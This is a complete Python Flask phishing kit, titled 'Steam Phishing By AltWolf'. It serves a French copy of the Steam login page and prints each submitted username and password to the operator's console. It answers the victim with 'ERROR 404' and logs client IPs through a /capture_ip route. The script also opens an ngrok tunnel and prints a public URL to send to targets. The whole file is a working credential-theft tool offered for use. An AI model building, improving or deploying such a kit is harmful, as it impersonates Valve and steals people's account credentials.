from flask import Flask, request, render_template_string
from pyngrok import ngrok
import time
import sys
import ctypes
import ctypes.wintypes

if sys.platform == "win32":
    _k32 = ctypes.windll.kernel32
    for _hid in (-10, -11, -12):
        _h = _k32.GetStdHandle(_hid)
        _m = ctypes.wintypes.DWORD(0)
        if _k32.GetConsoleMode(_h, ctypes.byref(_m)):
            _k32.SetConsoleMode(_h, _m.value | 0x0004 | 0x0001)
    _k32.SetConsoleOutputCP(65001)
    _k32.SetConsoleCP(65001)
    if hasattr(sys.stdout, 'reconfigure'):
        try: sys.stdout.reconfigure(encoding='utf-8', errors='replace')
        except: pass

def print_violet_white_gradient(text, total_time=0.010):
    gradient = [(128, 0, 128), (255, 255, 255)]
    gradient_step = 1.0 / (len(text) - 1)
    interval = total_time / len(text)

    for i in range(len(text)):
        ratio = i * gradient_step
        r = int(gradient[0][0] * (1 - ratio) + gradient[1][0] * ratio)
        g = int(gradient[0][1] * (1 - ratio) + gradient[1][1] * ratio)
        b = int(gradient[0][2] * (1 - ratio) + gradient[1][2] * ratio)

        sys.stdout.write(f"\033[38;2;{r};{g};{b}m{text[i]}")
        sys.stdout.flush()
        time.sleep(interval)

    sys.stdout.write("\033[0m\n")

ertt = """                                              
                                               
                                               
                 :+#%%%%%%#*-                  
             -#%%%%%%%%%%%%%%%%%+.             
          -#%%%%%%%%%%%%%%%%%%%%%%%+           
        -#%%%%%%%%%%%%%%%%%%%%%%%%%%%+         
       *%%%%%%%%%%%%%%%%%*       =%%%%%.       
      %%%%%%%%%%%%%%%%%*   .+**-   :%%%%:      
     #%%%%%%%%%%%%%%%%=  -+.    =+  .%%%%:     
    +%%%%%%%%%%%%%%%%%   *       +-  +%%%%     
   .#%%%%%%%%%%%%%%%%:   #.      +:  *%%%%=    
   -#%%%%%%%%%%%%%%*.    .*-   .+-  :%%%%%#    Steam Phishing By AltWolf
      :+#%%%%%%%%%+         :-:.   =#%%%%%*         Version V1.0.1
          .-*##*+-              :+########*        Work with ngrok
                -*-        .*#############=    
                   -=    -###############*.    
     **+:.          =..*#################:     
      *****+       -= +*****************:      
       +****+. -**=  =*****************.       
        :+*****=--=******************-         
          :++++++++++++++++++++++++-           
            .:=+++++++++++++++++-.             
                 .-==+++++=-.                  
                                               
                                       
"""
print_violet_white_gradient(ertt)

app = Flask(__name__)

html_contenta = '''
<!DOCTYPE html>
<html lang="fr">
<head>
<meta charset="UTF-8"/>
<meta name="viewport" content="width=device-width,initial-scale=1"/>
<title>Connexion</title>
<style>
*, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
html, body { height: 100%; font-family: "Arial", sans-serif; background: #1b2838; color: #c6d4df; }
a { color: #4b8bbe; text-decoration: none; }
a:hover { color: #66c0f4; text-decoration: underline; }

/* ── GLOBAL HEADER ── */
#global_header {
  background: #171a21;
  height: 52px;
  display: flex;
  align-items: stretch;
  border-bottom: 1px solid #000;
}
#global_header .content {
  display: flex;
  align-items: stretch;
  width: 100%;
  max-width: 1540px;
  margin: 0 auto;
  padding: 0 16px;
}
.logo { display: flex; align-items: center; margin-right: 16px; flex-shrink: 0; }

.supernav_container { display: flex; align-items: stretch; flex: 1; }
.menuitem {
  display: flex; align-items: center;
  padding: 0 12px;
  font-size: 13px; font-weight: 700;
  color: #c6d4df;
  letter-spacing: 0.05em;
  text-transform: uppercase;
  cursor: pointer; white-space: nowrap;
  text-decoration: none;
  transition: color 0.15s;
}
.menuitem:hover { color: #fff; text-decoration: none; }

#global_actions { display: flex; align-items: center; margin-left: auto; flex-shrink: 0; }
.header_installsteam_btn_green {
  display: flex; align-items: center;
  background: linear-gradient(to bottom, #a4d007 5%, #536904 95%);
  border-radius: 2px; padding: 0 14px; height: 28px; margin-right: 12px;
  font-size: 12px; font-weight: 700; color: #d2e885;
  text-decoration: none; white-space: nowrap; letter-spacing: 0.04em;
}
.header_installsteam_btn_green:hover { background: linear-gradient(to bottom, #b8e208 5%, #5f7a04 95%); color: #eaf8aa; text-decoration: none; }
.global_action_link { font-size: 12px; color: #c6d4df; white-space: nowrap; }
.global_action_link:hover { color: #fff; }

/* ── STORE NAV ── */
#store_nav_area {
  background: linear-gradient(to bottom, #d8dfe7 0%, #c6cdd7 100%);
  height: 46px; display: flex; align-items: stretch;
  border-bottom: 1px solid #a0a8b3;
}
.store_nav_inner {
  display: flex; align-items: stretch;
  width: 100%; max-width: 1540px;
  margin: 0 auto; padding: 0 16px;
}
.store_nav_btn {
  display: flex; align-items: center; gap: 4px;
  padding: 0 12px;
  font-size: 12px; font-weight: 700; color: #3d3d2f;
  letter-spacing: 0.03em; cursor: pointer; white-space: nowrap;
  background: none; border: none; border-bottom: 3px solid transparent;
  transition: border-color 0.15s, color 0.15s;
}
.store_nav_btn:hover { color: #000; border-bottom-color: #4b8bbe; }
.store_nav_btn svg { width: 10px; height: 10px; fill: currentColor; margin-top: 1px; }
.store_nav_search { margin-left: auto; display: flex; align-items: center; }
.store_nav_search form {
  display: flex; align-items: center;
  background: #fff; border: 1px solid #8f98a0; border-radius: 2px; overflow: hidden;
}
.store_nav_search input {
  border: none; outline: none; background: transparent;
  font-size: 12px; color: #333; padding: 4px 8px; width: 200px;
}
.store_nav_search input::placeholder { color: #8f98a0; }
.store_nav_search button {
  background: #8f98a0; border: none; cursor: pointer;
  padding: 4px 8px; display: flex; align-items: center; transition: background 0.15s;
}
.store_nav_search button:hover { background: #6e7880; }
.store_nav_search button svg { width: 14px; height: 14px; fill: #fff; }

/* ── HERO ── */
.login_hero {
  position: relative; width: 100%; height: 270px;
  overflow: hidden; background: #0e1822;
}
/* 👇 Remplace VOTRE_LIEN_ICI par l'URL de ton image */
.login_hero_bg {
  position: absolute; inset: 0;
  background-image: url('https://store.akamai.steamstatic.com/public/shared/images/joinsteam/new_login_bg_steam_china.jpg');
  background-size: cover; background-position: center;
  opacity: 0.6;
}
.login_hero_gradient {
  position: absolute; inset: 0;
  background: linear-gradient(180deg, rgba(23,26,33,0) 0%, rgba(23,26,33,0.3) 55%, rgba(27,40,56,1) 100%);
}
.login_hero_title {
  position: absolute; bottom: 32px;
  left: 50%; transform: translateX(-50%);
  width: 100%; max-width: 960px; padding: 0 20px;
}
.login_hero_title h1 { font-size: 30px; font-weight: 700; color: #c6d4df; }

/* ── PAGE CONTENT ── */
.page_content { background: #1b2838; padding-bottom: 40px; }
.login_wrap { max-width: 960px; margin: 0 auto; padding: 0 20px; }

.login_box_wrapper {
  display: flex; gap: 0; align-items: flex-start;
  background: rgba(0,0,0,0.55);
  border-radius: 4px;
  padding: 32px 36px 36px 36px;
  margin-top: 0;
}

/* Formulaire */
.login_form_col { flex: 1; min-width: 0; padding-right: 60px; }
.login_form_inner { background: transparent; padding: 0; }

.form_section_label {
  font-size: 11px; font-weight: 700; color: #66c0f4;
  letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 10px;
}
.form_row { margin-bottom: 12px; }
.form_row_label {
  font-size: 11px; font-weight: 700; color: #c6d4df;
  letter-spacing: 0.06em; text-transform: uppercase; margin-bottom: 5px;
}
.form_row input {
  width: 100%; background: #32353c; border: 1px solid #000;
  border-radius: 3px; color: #fff; font-size: 14px; padding: 11px 12px;
  outline: none; transition: border-color 0.15s;
  box-shadow: inset 0 1px 4px rgba(0,0,0,0.5);
}
.form_row input:focus { border-color: #66c0f4; }

.remember_row { display: flex; align-items: center; gap: 8px; margin: 14px 0 22px; }
.cb_wrap {
  width: 18px; height: 18px; background: #4f94bc; border-radius: 2px;
  display: flex; align-items: center; justify-content: center; cursor: pointer; flex-shrink: 0;
}
.cb_wrap svg { width: 11px; height: 11px; }
.remember_row label { font-size: 13px; color: #c6d4df; cursor: pointer; }

.btn_login_wrap { display: flex; justify-content: center; }
.btn_login {
  display: block; width: 68%; padding: 12px 0;
  background: linear-gradient(to bottom, #4dc8f0 0%, #1b9dd9 100%);
  border: none; border-radius: 3px; color: #fff;
  font-size: 16px; font-weight: 700; letter-spacing: 0.03em;
  cursor: pointer; text-align: center;
  box-shadow: 0 2px 6px rgba(0,0,0,0.4);
  transition: filter 0.15s;
}
.btn_login:hover { filter: brightness(1.08); }
.btn_login:active { filter: brightness(0.92); }

.help_link {
  display: block; font-size: 12px; color: #8cb9d8;
  text-align: center; margin-top: 22px; text-decoration: underline;
}
.help_link:hover { color: #66c0f4; }

/* QR */
.login_qr_col { width: 230px; flex-shrink: 0; }
.qr_section_label {
  font-size: 11px; font-weight: 700; color: #66c0f4;
  letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 12px;
}
.qr_container {
  background: #fff; padding: 10px; border-radius: 3px;
  width: 200px; display: flex; align-items: center; justify-content: center;
}
.qr_desc { margin-top: 12px; font-size: 12px; color: #8cb9d8; line-height: 1.55; max-width: 200px; }
.qr_desc a { color: #4b8bbe; }

/* Bottom row */
.login_bottom_row {
  display: flex; align-items: center; gap: 28px;
  margin-top: 28px; padding-top: 24px;
  border-top: 1px solid #2a475e;
}
.login_bottom_row .headline { font-size: 15px; font-weight: 700; color: #c6d4df; margin-bottom: 10px; }
.btn_create {
  display: inline-block; padding: 8px 18px;
  background: linear-gradient(to bottom, #67c1f5 0%, #3d93c8 100%);
  border-radius: 2px; color: #fff; font-size: 14px; font-weight: 700;
  letter-spacing: 0.04em; text-decoration: none;
  box-shadow: inset 0 1px 0 rgba(255,255,255,0.3), 0 2px 3px rgba(0,0,0,0.3);
  white-space: nowrap; transition: filter 0.15s;
}
.btn_create:hover { filter: brightness(1.08); text-decoration: none; color: #fff; }
.subtext { font-size: 13px; color: #8cb9d8; line-height: 1.6; }
.subtext a { color: #4b8bbe; }

/* Footer */
#footer { background: #171a21; border-top: 1px solid #000; padding: 20px; margin-top: 30px; }
.footer_content { max-width: 960px; margin: 0 auto; }
.footer_rule { border: none; border-top: 1px solid #2a475e; margin: 12px 0; }
#footer_text { font-size: 11px; color: #4e6b7f; line-height: 1.8; }
#footer_text a { color: #4b8bbe; font-size: 11px; }
#footer_text a:hover { color: #66c0f4; }
.valve_links { font-size: 11px; color: #4e6b7f; margin-top: 10px; }
.valve_links a { color: #4b8bbe; font-size: 11px; }
.valve_links a:hover { color: #66c0f4; }
</style>
</head>
<body>

<!-- GLOBAL HEADER -->
<div id="global_header">
  <div class="content">
    <div class="logo">
      <a href="https://store.steampowered.com/" aria-label="Accueil Steam">
        <!-- Logo Steam SVG fidèle -->
        <svg version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="178px" height="44px" viewBox="0 0 355.666 89.333" xml:space="preserve">
<g>
	<path fill="#C5C3C0" d="M44.238,0.601C21,0.601,1.963,18.519,0.154,41.29l23.71,9.803c2.009-1.374,4.436-2.179,7.047-2.179c0.234,0,0.467,0.008,0.698,0.021l10.544-15.283c0-0.073-0.001-0.144-0.001-0.216c0-9.199,7.483-16.683,16.683-16.683c9.199,0,16.682,7.484,16.682,16.683c0,9.199-7.483,16.684-16.682,16.684c-0.127,0-0.253-0.003-0.379-0.006l-15.038,10.73c0.008,0.195,0.015,0.394,0.015,0.592c0,6.906-5.617,12.522-12.522,12.522c-6.061,0-11.129-4.326-12.277-10.055L1.678,56.893c5.25,18.568,22.309,32.181,42.56,32.181c24.432,0,44.237-19.806,44.237-44.235C88.475,20.406,68.669,0.601,44.238,0.601"/>
	<path fill="#C5C3C0" d="M27.875,67.723l-5.434-2.245c0.963,2.005,2.629,3.684,4.841,4.606c4.782,1.992,10.295-0.277,12.288-5.063c0.965-2.314,0.971-4.869,0.014-7.189c-0.955-2.321-2.757-4.131-5.074-5.097c-2.299-0.957-4.762-0.922-6.926-0.105l5.613,2.321c3.527,1.47,5.195,5.52,3.725,9.047C35.455,67.526,31.402,69.194,27.875,67.723"/>
	<path fill="#C5C3C0" d="M69.95,33.436c0-6.129-4.986-11.116-11.116-11.116c-6.129,0-11.116,4.987-11.116,11.116c0,6.13,4.987,11.115,11.116,11.115C64.964,44.55,69.95,39.565,69.95,33.436 M50.502,33.417c0-4.612,3.739-8.35,8.351-8.35c4.612,0,8.351,3.738,8.351,8.35s-3.739,8.35-8.351,8.35C54.241,41.767,50.502,38.028,50.502,33.417"/>
	<path fill="#C5C3C0" d="M135.718,30.868l-2.964,5.21c-2.283-1.595-5.377-2.555-8.078-2.555c-3.087,0-4.997,1.278-4.997,3.567c0,2.781,3.393,3.428,8.436,5.238c5.421,1.917,8.537,4.17,8.537,9.135c0,6.793-5.342,10.608-13.02,10.608c-3.742,0-8.256-0.966-11.726-3.077l2.162-5.776c2.819,1.489,6.191,2.372,9.197,2.372c4.052,0,5.978-1.495,5.978-3.705c0-2.529-2.937-3.289-7.678-4.859c-5.403-1.804-9.147-4.171-9.147-9.666c0-6.197,4.963-9.756,12.104-9.756C129.499,27.604,133.499,29.181,135.718,30.868"/>
	<polygon fill="#C5C3C0" points="158.888,34.161 158.888,61.5 151.909,61.5 151.909,34.161 141.779,34.161 141.779,28.175 168.988,28.175 168.988,34.161"/>
	<polygon fill="#C5C3C0" points="183.7,34.143 183.7,41.652 197.056,41.652 197.056,47.638 183.7,47.638 183.7,55.459 199.196,55.459 199.196,61.5 176.723,61.5 176.723,28.175 199.196,28.175 199.196,34.143"/>
	<path fill="#C5C3C0" d="M214.773,55.03l-2.206,6.471h-7.316l12.495-33.325h7.025L237.619,61.5h-7.563l-2.254-6.471H214.773z M221.219,36.125l-4.551,13.343h9.196L221.219,36.125z"/>
	<polygon fill="#C5C3C0" points="273.436,41.056 264.316,60.529 260.378,60.529 251.406,41.23 251.406,61.5 244.723,61.5 244.723,28.175 251.391,28.175 262.591,52.231 273.393,28.175 280.119,28.175 280.119,61.5 273.437,61.5"/>
	<path fill="#C5C3C0" d="M293.611,32.379c0,2.864-2.146,4.649-4.609,4.649c-2.472,0-4.623-1.785-4.623-4.649c0-2.863,2.151-4.636,4.623-4.636C291.466,27.743,293.611,29.516,293.611,32.379 M285.154,32.379c0,2.396,1.726,3.901,3.848,3.901c2.114,0,3.833-1.505,3.833-3.901c0-2.403-1.719-3.885-3.833-3.885C286.886,28.494,285.154,29.994,285.154,32.379 M289.066,30.01c1.195,0,1.597,0.632,1.597,1.315c0,0.626-0.371,1.046-0.823,1.26l1.071,2.007h-0.877l-0.903-1.779H288.2v1.779h-0.73V30.01H289.066z M288.207,32.142h0.814c0.527,0,0.838-0.331,0.838-0.747c0-0.42-0.223-0.69-0.84-0.69h-0.813V32.142z"/>
</g>
        </svg>
      </a>
    </div>

    <div class="supernav_container" role="navigation">
      <a class="menuitem" href="#">MAGASIN</a>
      <a class="menuitem" href="#">COMMUNAUTÉ</a>
      <a class="menuitem" href="#">À PROPOS</a>
      <a class="menuitem" href="#">SUPPORT</a>
    </div>

    <div id="global_actions">
      <a class="header_installsteam_btn_green" href="#">Installer Steam</a>
      <a class="global_action_link" href="#">se connecter</a>
      &nbsp;|&nbsp;
      <span class="global_action_link" style="cursor:pointer;">langue</span>
    </div>
  </div>
</div>

<!-- STORE NAV -->
<div id="store_nav_area">
  <div class="store_nav_inner">
    <button class="store_nav_btn">Parcourir <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <button class="store_nav_btn">Recommandations <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <button class="store_nav_btn">Catégories <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <button class="store_nav_btn">Matériel <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <button class="store_nav_btn">Manières de jouer <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <button class="store_nav_btn">Sections spéciales <svg viewBox="0 0 12 12"><path fill-rule="evenodd" d="M5.81 6.36L8.51 3.66l1.18 1.18L5.81 8.72 1.93 4.84l1.18-1.18z"/></svg></button>
    <div class="store_nav_search">
      <form action="#" method="GET">
        <input type="text" name="term" placeholder="Rechercher dans le magasin" autocomplete="off"/>
        <button type="submit">
          <svg viewBox="0 0 18 18"><path d="M13.83 12.08A7.5 7.5 0 1 0 12.08 13.83L16 17.7l1.7-1.7-3.87-3.92zM8 14a6 6 0 1 1 0-12A6 6 0 0 1 8 14z"/></svg>
        </button>
      </form>
    </div>
  </div>
</div>

<!-- HERO BANNER -->
<div class="login_hero">
  <div class="login_hero_bg"></div>
  <div class="login_hero_gradient"></div>
  <div class="login_hero_title"><h1>Connexion</h1></div>
</div>

<!-- PAGE CONTENT -->
<div class="page_content">
  <div class="login_wrap" style="padding-top:28px;">
    <div class="login_box_wrapper">

    <!-- FORMULAIRE -->
    <div class="login_form_col">
    <div class="login_form_inner">
        <div class="form_section_label">Se connecter avec un nom de compte</div>
        <form method="post" class="login-form">
        <div class="form_row">
            <input type="text" name="username" placeholder="Username or email" id="username" autocomplete="username"/>
        </div>
        <div class="form_row">
            <div class="form_row_label">Mot de passe</div>
            <input type="password" name="password" placeholder="Password" id="password" autocomplete="current-password"/>
        </div>
        <div class="remember_row">
            <div class="cb_wrap">
            <svg viewBox="0 0 12 12" fill="none" stroke="#fff" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round">
                <polyline points="1.5,6.5 4.5,9.5 10.5,2.5"/>
            </svg>
            </div>
            <label>Se souvenir de moi</label>
        </div>
        <div class="btn_login_wrap">
            <button class="btn_login" type="submit">Se connecter</button>
        </div>
        </form>
        <a class="help_link" href="#">J'ai besoin d'aide pour accéder à mon compte&nbsp;!</a>
    </div>
    </div>
	</div>

      <!-- QR CODE -->
      <div class="login_qr_col">
        <div class="qr_section_label">Ou avec un code QR</div>
        <div class="qr_container">
          <canvas id="qrCanvas" width="180" height="180" style="image-rendering:pixelated;display:block;"></canvas>
        </div>
        <p class="qr_desc">
          Utilisez l'<a href="#">application mobile Steam</a> pour vous connecter avec un code&nbsp;QR.
        </p>
      </div>

    </div>

    <!-- BOTTOM ROW -->
    <div class="login_bottom_row">
      <div>
        <div class="headline">Première fois sur Steam&nbsp;?</div>
        <a href="#" class="btn_create">Créer un compte</a>
      </div>
      <div class="subtext">
        C'est gratuit et facile. Découvrez des milliers de jeux et jouez avec des millions de personnes.
        <a href="#"> En savoir plus sur Steam</a>
      </div>
    </div>

  </div>
</div>

<!-- FOOTER -->
<div id="footer">
  <div class="footer_content">
    <hr class="footer_rule"/>
    <div id="footer_text">
      <div>© 2026 Valve Corporation. Tous droits réservés. Toutes les marques commerciales sont la propriété de leurs titulaires aux États-Unis et dans d'autres pays.</div>
      <div>TVA incluse pour tous les prix (le cas échéant).&nbsp;&nbsp;
        <a href="#">Politique de protection de la vie privée</a> &nbsp;|&nbsp;
        <a href="#">Mentions légales</a> &nbsp;|&nbsp;
        <a href="#">Accessibilité</a> &nbsp;|&nbsp;
        <a href="#">Accord de souscription Steam</a> &nbsp;|&nbsp;
        <a href="#">Remboursements</a> &nbsp;|&nbsp;
        <a href="#">Cookies</a>
      </div>
    </div>
    <hr class="footer_rule"/>
    <div class="valve_links">
      <a href="#">À propos de Valve</a> &nbsp;|&nbsp;
      <a href="#">Carrières</a> &nbsp;|&nbsp;
      <a href="#">Steamworks</a> &nbsp;|&nbsp;
      <a href="#">Distribution Steam</a> &nbsp;|&nbsp;
      <a href="#">Support</a> &nbsp;|&nbsp;
      <a href="#">Recyclage</a> &nbsp;|&nbsp;
      <a href="#">Cartes-cadeaux</a>
    </div>
  </div>
</div>

<script>
/* ── QR CODE canvas ── */
(function(){
  // Finder pattern 7x7
  const fp = [
    [1,1,1,1,1,1,1],
    [1,0,0,0,0,0,1],
    [1,0,1,1,1,0,1],
    [1,0,1,1,1,0,1],
    [1,0,1,1,1,0,1],
    [1,0,0,0,0,0,1],
    [1,1,1,1,1,1,1]
  ];

  const SZ = 25;
  const M = Array.from({length:SZ}, ()=>new Array(SZ).fill(0));

  // Place finder patterns
  const placeFP = (row, col) => fp.forEach((r,i)=>r.forEach((v,j)=>{ M[row+i][col+j]=v; }));
  placeFP(0,0); placeFP(0,SZ-7); placeFP(SZ-7,0);

  // Timing patterns
  for(let i=8; i<SZ-8; i++){
    M[6][i] = i%2===0 ? 1 : 0;
    M[i][6] = i%2===0 ? 1 : 0;
  }

  // Reserved zones
  const reserved = (r,c) =>
    (r<9&&c<9)||(r<9&&c>=SZ-8)||(r>=SZ-8&&c<9)||(r===6)||(c===6);

  // Fill data area with stable pseudo-random
  let s = 0x6D73;
  const rng = () => { s ^= s<<13; s ^= s>>17; s ^= s<<5; return (s>>>0)%2; };

  for(let r=0;r<SZ;r++)
    for(let c=0;c<SZ;c++)
      if(!reserved(r,c)) M[r][c]=rng();

  // Draw
  const canvas = document.getElementById('qrCanvas');
  const ctx = canvas.getContext('2d');
  const cw = canvas.width, ch = canvas.height;
  const mod = Math.floor(Math.min(cw,ch) / SZ);
  const ox = Math.floor((cw - mod*SZ)/2);
  const oy = Math.floor((ch - mod*SZ)/2);

  ctx.fillStyle = '#ffffff';
  ctx.fillRect(0,0,cw,ch);
  ctx.fillStyle = '#000000';

  for(let r=0;r<SZ;r++)
    for(let c=0;c<SZ;c++)
      if(M[r][c]) ctx.fillRect(ox+c*mod, oy+r*mod, mod, mod);
})();
</script>

</body>
</html>
'''
def get_client_ip():
    if 'X-Forwarded-For' in request.headers:
        return request.headers['X-Forwarded-For'].split(',')[0]
    return request.remote_addr

@app.route('/capture_ip', methods=['GET'])
def capture_ip():
    client_ip = request.args.get('ip')
    print(f"Client Public IP: {client_ip}")
    return {'ip': client_ip}, 200

@app.route('/', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        print(f"Username/Email: {username}")
        print(f"Password: {password}")
        return "ERROR 404"
    return render_template_string(html_contenta)

if __name__ == '__main__':
    ngrok_auth_token = input("Token ngrok : ")
    ngrok.set_auth_token(ngrok_auth_token)
    port = 5000
    ngrok_tunnel = ngrok.connect(port)
    public_url = ngrok_tunnel.public_url
    print(f"Tunnel public disponible à l'adresse : {public_url}")
    print("Envoyez l'URL suivante :")
    print(public_url)
    app.run(host='0.0.0.0', port=port, debug=False)